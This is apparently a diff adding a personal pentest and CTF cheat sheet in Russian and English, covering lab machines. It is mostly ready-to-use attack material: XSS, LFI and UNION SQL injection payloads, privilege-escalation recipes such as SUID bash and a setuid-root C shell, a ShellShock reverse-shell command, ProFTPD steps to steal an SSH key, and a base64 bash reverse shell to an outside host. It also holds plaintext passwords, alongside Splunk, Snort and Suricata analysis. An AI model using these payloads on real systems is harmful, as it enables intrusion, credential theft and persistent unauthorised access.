@@ -1,0 +1,407 @@
+xss&xfs cross site scripting:
+<iframe src="javascript:alert(`xss`)"> 
+:
+
+
+php lfi rfi:
+page=data:text/plain,<?php%20phpinfo();%20?>
+page=../../../etc/passwd we can url encode 
+page=/etc/passwd
+page=php://filter/encrypt.base64-encode/resource=/etc/passwd
+:
+
+netdiscover ip scanner in local
+find vulnerabilities:
+
+linpeas.sh
+Linux-exploit-suggester.sh
+
+IP:
+10.121.2.26 - print manager RDP
+https://www.youtube.com/watch?v=63nCXKxe9aw Как исправить "Boot\BCD" (youtube.com)
+
+SPLUNK:
+index=<ваш_индекс> sourcetype=suricata 
+| rex "\[\*\*\] \[(?<signature_id>\d+:\d+:\d+)\] (?<alert_message>[^\[]+)" 
+| stats count by alert_message 
+| sort - count 
+| head 1
+
+LINUX COMMANDS:
+hide prompt for temporary 
+export PS1=""
+return
+export PS1='\u@\h:\w\$ '
+
+:
+
+binwalk - (binwalk -e .png)
+
+xfreerdp /u:user /p:passwrd /v:ip #RDP
+
+john - расшифровка ключей
+john --format=hashformat --wordist=pathtowords hash.txt
+single crack:: 
+john --single --format=[format] [path to file]
+::
+
+
+zip2john *.zip
+:
+
+
+traceroute example.com - определить топологию сети и промежуточные роутеры
+
+
+
+
+Snort:
+
+sudo snort -c local.rules -dev -l . -r  file
+sudo snort -c local.rules -r  file
+sudo snort -d -r log
+sudo snort -c local.rules -q -Q --daq afpacket -i eth0:eth1  -A full
+
+enum4linux для smb -a список юзеров
+
+privilege escalation:
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+chmod +x LinEnum.sh -OR- ./LinEnum.sh
+-r — для получения более подробной информации.
+-k — поиск эксплойтов для известной версии ядра.
+-t — задаёт вывод отчёта в определённую директорию.
+./LinEnum.sh -r -k -t /tmp/linenum_report.txt
+
+Найти файлы
+
+find . -name flag1.txt: найти файл с именем «flag1.txt» в текущем каталоге
+find /home -name flag1.txt: найдите имена файлов «flag1.txt» в каталоге /home
+find / -type d -name config: найдите каталог с именем config в «/»
+find / -type f -perm 0777: найти файлы с правами доступа 777 (файлы, доступные для чтения, записи и выполнения всем пользователям)
+find / -perm a=x: найти исполняемые файлы
+find /home -user frank: найти все файлы пользователя «frank» в «/home»
+find / -mtime 10: найти файлы, которые были изменены за последние 10 дней
+find / -atime 10: найти файлы, к которым был доступ за последние 10 дней
+find / -cmin -60: найти файлы, измененные за последний час (60 минут)
+find / -amin -60: найти доступы к файлам за последний час (60 минут)
+find / -size 50M: найти файлы размером 50 МБ or +50M more than 50
+find / -writable -type d 2>/dev/null: Найти папки, доступные для записи всем пользователям
+find / -perm -222 -type d 2>/dev/null: Найти папки, доступные для записи всем пользователям
+find / -perm -o w -type d 2>/dev/null: Найти папки, доступные для записи всем пользователям
+find / -perm -o x -type d 2>/dev/null : Найти папки с исполняемыми файлами world-executable
+find / -writable 2>/dev/null Простой поиск папок, доступных для записи
+find / -name perl*
+find / -name python*
+find / -name gcc*
+find / -perm -u=s -type f 2>/dev/null: Поиск файлов с битом SUID, который позволяет запустить файл с более высоким уровнем привилегий, чем у текущего пользователя.
+find / -type f -perm -04000 -ls 2>/dev/null  выведет список файлов, у которых установлены биты SUID или SGID.
+hostname
+uname -a
+cat /proc/version
+cat /etc/issue
+ps or ps aux
+env
+sudo -l
+ls -la
+id
+cat /etc/passwd or cat /etc/passwd | cut -d ":" -f 1 or cat /etc/passwd | grep home
+netstat -a or -l or -at or -lt or tp
+cat /etc/crontab or cat /etc/shadow
+
+unshadow passwd shadow | tee cracked 
+john wordlist=<filename> filename
+
+getcap -r / 2>/dev/null
+
+crontab: 
+	file:
+		#!/bin/bash
+		chmod u+s /bin/bash
+	chmod 777 <filename>
+	/bin/bash -p
+
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+
+echo $PATH
+export PATH=/name:$PATH
+cd name 
+echo "/bin/bash" > file
+chmod +x file
+
+cat /etc/exports
+
+showmount -e <attacked ip>
+mount -o rw ip:path /path/dir
+
+
+
+language c:
+gcc -o <new name> <file c>
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main (void)
+{ setgid(0);
+  setuid(0);
+  system("/bin/bash");
+  return 0;
+}
+
+if find sudo
+sudo find . -exec /bin/bash \; -quit
+
+
+python 34900.py payload=reverse rhost=10.10.245.163 lhost=10.10.144.252 lport=6666 pages=/cgi-bin/test.cgi #ShellShock
+python -m http.server
+
+cat /etc/*-release #linux vers
+uname -a #os vers
+
+получение оболочки:
+export TERM=xterm
+/usr/bin/script -qc /bin/bash /dev/null
+получение доступа к изменению файла:
+bash -R a+rwX [name]
+
+Crackstation Расшифрование хэшей
+
+SQL:
+drop database db_name - уничтожить бд
+create database db_name - создать бд
+show databases - показать все бд
+use db_name - использовать бд
+create table table_name (id, name, etc) - создать таблицу
+show tables - показать таблицы
+describe table_name - показать названия колонок таблицы
+alter table_name - добавить,изменить, переим-ь колонку
+insert into (id,name, etc) values (id, name, etc) - добавить данные в таблицу
+select name,id,etc from table_name where id == 1;  - выбрать из таблицы 
+update table_name SET row_name="something" where something=something - обновить данные из таблицы
+delete from table_name where something = something; 
+select distinct * from table_name; - показывает только уникальные данные
+select name, COUNT(*) from table_name GROUP BY name; - группировка
+order by - по возрастанию и т.д., having - искать похожие в колонке
+where like - искать похожие везде
+between - между
+SELECT CONCAT(name, " is a type of ", category, " book.") AS book_info FROM books; - объединени данных колонок
+SELECT category, GROUP_CONCAT(name SEPARATOR ", ") AS books FROM books GROUP BY category; - объединени групп данных колонок
+SELECT SUBSTRING(published_date, 1, 4) AS published_year FROM books; - вывод начиная с опрделенной позиции
+SELECT LENGTH(name) AS name_length FROM books; - возвращает количество символов в строке включая всё
+SELECT COUNT(*) AS total_books FROM books -  возвращает количество записей в выражении
+SELECT SUM(price) AS total_price FROM books - суммирует все значения
+SELECT MAX(published_date) AS latest_book FROM books; - ты знаешь
+SELECT MIN(published_date) AS earliest_book FROM books - ты знаешь
+select group_concat(name separator " & ") as h from hacking_tools where substring(amount, -1) != 0; - пример
+
+
+
+
+?id=0 UNION select 1,1,group_concat(table_name) from information_schema.tables WHERE table_schema = 'database()'
+concat_ws  = UNION SELECT 1,concat_ws(0x3,table_name,column_name) (функция возвращает строку, возникающую в результате объединения двух или более строковых значений в сквозной форме)
+information_schema.columns = (это системная база данных, содержащая представления. Используя эти представления, вы можете получить информацию о метаданных объектов базы данных.)
+example: -1' UNION SELECT 1,concat_ws(0x3,table_name,column_name),3 from information_schema.columns where table_name='secret' ;-- -
+
+-1 /*!or/*!login/*!like/**/0x2567656e746f6f25*/ #обход фильтров пробелов,запятых и т.д.
+-1 or id <=(select ascii(mid(pass,1,1)) from users where login='fast') если разрешены только числа на вывод
+
+
+Whoami - Username
+pwd - print working directory
+find - искать (find -name txt.txt, find -name *.xlsx)
+grep - искать что-то в файле
+
+& - Этот оператор позволяет вам запускать команды в фоновом режиме вашего терминала.
+&& - Этот оператор позволяет вам объединить несколько команд в одной строке вашего терминала.
+> - Этот оператор является перенаправителем — это означает, что мы можем взять вывод команды (например, используя cat для вывода файла) и направить его куда-нибудь еще.
+>> - Этот оператор выполняет ту же функцию, что и >оператор, но добавляет вывод, а не заменяет (то есть ничего не перезаписывается).
+
+
+
+
+
+
+
+
+all powershell:
+
+:
+
+index="botsv2" host=MACLORY-AIR13 sourcetype="interfaces"
+| regex _raw="([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}"
+
+dest 00:0C:29:72:54:3A
+src 58:49:3B:8A:8B:11
+
+vuln scan src_ip = 45.77.65.211
+
+index="botsv2" sourcetype="stream:http"
+| spath src_ip 
+| where src_ip="45.77.65.211" 
+| spath uri_path 
+| where uri_path="/member.php"
+| spath status 
+| where status=200
+| spath dest_content
+| rex field=dest_content "(?s)<dd>.*?</dd>.*?<dd>(?<sql_query>.*?)</dd>"
+| table sql_query
+
+index="botsv2" sourcetype="stream:http"
+
+privilege escalation:
+
+CTF beeline:
+ftp:
+flag.jpg
+18998  status 213
+2 frames 87 91
+
+dns tunnel:
+
+EPDYVXZERMZDGODRWCXTGZEGILSNQVLMOGGNOAYPIXBFEPGTOYCQUXTIPXEKXTGQGJMINHHOEAARLAPH
+
+2895	141.791631	192.168.5.1	192.168.5.22	DNS	155	Standard query response 0x0004 TXT 7EED01900Eb578d386.t.freeserver.site TXT
+
+Attack chain in Wireshark traffic dump > traf2.pcap:
+10.14.200.50 SYN flag and ACK flag and RST flag
+
+10.14.3.20,10 rst flag
+
+10.14.3.100 NBNS to 10.14.3.255
+
+kerberos: oik-client$@COMPANY.LOCAL
+
+10.14.200.50 to 10.14.2.11 http
+
+10.14.200.50 to	10.14.2.11	HTTP	code:220	GET /vCK5K0xq.js0x70 HTTP/1.1 
+
+Auditd:
+
+type=PATH msg=audit(1642660610.112:170758): item=1 name="/var/www/html/shell.php" inode=98429 dev=fe:01 mode=0100644 ouid=33 ogid=33 rdev=00:00 nametype=DELETE
+
+type=PATH msg=audit(1642660610.584:170782): item=1 name="/var/www/html/FLAG.txt" inode=98633 dev=fe:01 mode=0100644 ouid=0 ogid=33 rdev=00:00 nametype=DELETE
+
+type=EXECVE msg=audit(1642592622.024:168365): argc=4 a0="wget" a1="http://10.7.200.50/FLAG.txt" a2="-O" a3="/var/www/html/FLAG.txt"
+
+type=PATH msg=audit(1642592622.032:168366): item=1 name="/var/www/html/FLAG.txt" inode=98555 dev=fe:01 mode=0100644 ouid=0 ogid=33 rdev=00:00 
+
+type=EXECVE msg=audit(1642592802.140:168424): argc=13 a0="openssl" a1="enc" a2="-aes-256-cbc" a3="-a" a4="-salt" a5="-in" a6="/var/www/html/FLAG.txt" a7="-out" a8="/var/www/html/FLAG.txt.encr" a9="-pass" a10="pass:p1pZoV2FW4Cz2rVIDRiIDg==" a11="-iv" a12="B51EA7FA2C6ACF333E3B859B6121339C"
+
+suricada > fast.log:
+
+11/08/2022-19:52:20.531688  [**] [1:9000110:1] Drupalgeddon2 (CVE-2018-7600) [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 10.64.5.69:43834 -> 10.69.2.11:80
+
+11/08/2022-19:52:20.794312  [**] [1:2024930:1] ET WEB_SERVER 401TRG Generic Webshell Request - POST with wget in body [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 10.64.5.69:43842 -> 10.69.1.11:80
+
+11/08/2022-16:00:46.421962  [**] [1:2010963:6] ET WEB_SERVER SELECT USER SQL Injection Attempt in URI [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 10.64.5.69:50226 -> 10.69.2.10:80
+
+11/08/2022-20:17:48.157712  [**] [1:4000002:1] Microsoft CryptoAPI usage in downloaded code (Possible Ransomware attack) [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {TCP} 10.64.5.69:80 -> 10.69.3.18:61028
+
+expose:
+10.10.108.9 
+
+nmap -sC -sV -v -p- ip
+22 ssh
+21 ftp
+53 domain  ISC BIND 9.16.1
+1337 http Apache httpd 2.4.41 
+1883 mosquitto version 1.6.9
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.177.224
+smbclient //10.10.177.224/anonymous
+get log.txt
+
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.177.224
+
+nc 10.10.177.224 21 #ProFTPD 1.3.5
+
+searchsploit ProFtpd 1.3.5
+
+cd downloads
+nc 10.10.177.224 21
+220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.177.224]
+$ SITE CPFR /home/kenobi/.ssh/id_rsa
+350 File or directory exists, ready for destination name
+$ SITE CPTO /var/tmp/id_rsa
+250 Copy successful
+sudo mkdir /mnt/kenobiNFS
+sudo mount 10.10.177.224:/var /mnt/kenobiNFS
+ls -la /mnt/kenobiNFS
+cp /mnt/kenobiNFS/tmp/id_rsa . 
+sudo chmod 600 id_rsa
+ssh -i id_rsa kenobi@10.10.177.224
+
+cat user.txt
+find / -perm -u=s -type f 2>/dev/null
+/usr/bin/menu
+cd tmp
+echo /bin/sh > curl
+chmod 777 curl
+export PATH=/tmp:$PATH
+/usr/bin/menu
+
+ollie:
+open ports 
+80 https
+22 ssh
+1337 open to nc
+
+login:
+admin
+passswd:
+OllieUnixMontgomery!
+
+phpIPAM IP address management [v1.4.5] (vulnerability:CVE-2022-23046)
+
+8.0.28-0 ubuntu 0.20.04.3/phpipam_ollie@localhost (4)
+
+curl...
+
+sudo lessecho almir.dzhumabaev > /root/king.txt
+sudo dd if=/dev/zero of=/dev/shm/root_f bs=1000 count=100
+sudo mkfs.ext3 /dev/shm/root_f
+sudo mkdir /dev/shm/sqashfs
+sudo mount -o loop /dev/shm/root_f /dev/shm/sqashfs/
+sudo chmod -R 777 /dev/shm/sqashfs/
+sudo lessecho USERNAME > /dev/shm/sqashfs/king.txt
+sudo mount -o ro,remount /dev/shm/sqashfs
+sudo mount -o bind /dev/shm/sqashfs/king.txt /root/king.txt
+sudo rm -rf /dev/shm/root_f 
+
+user-agent: *
+disallow: /vbcms
+8002/lesson/1
+
+получение оболочки:
+export TERM=xterm
+/usr/bin/script -qc /bin/bash /dev/null
+получение доступа к изменению файла:
+bash -R a+rwX [name]
+root /home/serv3/backups/backup.sh
+
+room:RED
+rIP - 10.10.124.10
+
+sup3r_p@s$w0rd!23
+2024/08/07 12:18:01 CMD: UID=1001  PID=18302  | /bin/sh -c echo YmFzaCAtYyAnbm9odXAgYmFzaCAtaSA+JiAvZGV2L3RjcC9yZWRydWxlcy50aG0vOTAwMSAwPiYxICYn | base64 -d | sh
